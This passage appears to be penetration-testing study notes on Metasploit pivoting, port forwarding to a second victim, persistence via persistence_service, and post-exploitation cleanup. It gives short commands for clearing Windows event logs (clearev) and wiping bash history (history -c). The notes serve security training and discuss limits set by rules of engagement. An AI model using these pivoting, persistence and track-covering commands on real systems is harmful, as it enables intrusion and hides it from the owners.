	+ See the route with: `run autoroute -p` 
	+ **Should background, not delete, the process** when done 
+ Will now need to run a meterpreter scan on victim 2 
	+ `scanner/portscan/tcp` is a good one 
		+ Scanning is done via victim machine 1
+ Will quickly see what ports are open, but will need to set up port forwarding to scan it with nmap 
+ On <mark style="background: #FFB86CA6;">victim 1</mark>, will use the following command:
	+ `portfwd add -l 1234 -p 80 -r VICTIM2_IP`
		+ This will allow us to scan port 1234 on on our localhost, and it will forward it to victim2 on port 80
	+ Then in another tab, we can use the traditional `nmap -sV -p 1234 localhost` 
+ Can now do any exploits on victim2
	+ Though should switch to a bind shell as they are now on the same network 
+ After a pivot, the <mark style="background: #FFF3A3A6;">whole post exploitation phase happens again</mark>

## Clearing ##

+ The exploitation and post-exploitation phases of a penetration test involves actively engaging with target systems and the data that is stored on these systems 
+ As a result, it is required to clear/undo any changes you made to the target system you have compromised based on the guidelines specified in the rules of engagement 
+ If you have transferred any files to the target system, should <mark style="background: #FFB86CA6;">keep track</mark> of them and <mark style="background: #FFB86CA6;">remove them when done</mark>
+ Good practice is to sore scripts, exploits and binaries in the <mark style="background: #FFF3A3A6;">temp</mark> directory, because once the system is restarted, all the files in the temp directory are cleared 
	+ `C:\\Temp` on windows
	+ `/tmp` on linux 

+ It is also important to consider the exploitation framework being used
	+ An example is <mark style="background: #FF5582A6;">MSF</mark>, which is notorious for generating and storing artifacts on the target system when using exploit or post modules 
	+ In <mark style="background: #FF5582A6;">MSF</mark>, should use <mark style="background: #BBFABBA6;">advanced</mark> command to see exact details of a module in order to clean up after it 
		+ The <mark style="background: #BBFABBA6;">info</mark> command will also give a summary of the module and more details 
+ Some well designed MSF modules provide you with instructions and resource scripts that have information regarding where the artifacts are stored and how they can be removed 

### Clearing Your Tracks on Windows ###

#### Clearing Windows Event Logs ####
+ In the context of windows, a typical post-exploitation technique pertinent to clear your tracks is to <mark style="background: #FF5582A6;">delete the Windows Event Log</mark>. This is something that should be avoided during a penetration test as the Windows Event log stores a lot of data that is important to the client you are performing the penetration test for.
+ Can **clear the windows event logs with**:
	+ `clearev` Meterpreter command on the target system 

#### Persistent Service ####
+ The Meterpreter module `persistence_service` Will start a service on system that can be used for persistent access
	+ It will generate a executable, transfer it, and turn it into a persistent service 
+ Watch for the artifacts it makes after its exploited: 
![[Screen Shot 2022-11-18 at 11.48.49 AM.png]]
+ See that is made an executable in the specified spot, and a service 
+ Since this is a well made module, can use the provide <mark style="background: #D2B3FFA6;">cleanup resource script</mark> 
	+ Will run it on the target system with:
		+ `resource PATH/TO/RESOURCE/SCRIPT` 

### Clearing Your Tracks on Linux ###

#### Metasploit Artifacts ####
+ As mentioned in the Windows clearing section, should by wary of artifacts a module makes, and use any clean up scripts and or manual deletion 

#### Bash cleanup ####
+ In a user or root directory, there is often a file called `.bash_history` that contains all bash history
	+ This should be cleaned up and the attacker history should be removed 
+ Can use the `history` command to see commands from that session 
	+ can append `-c` to clear the history
+ Should run `history -c` <mark style="background: #FF5582A6;">before logging out</mark> from any exploited machine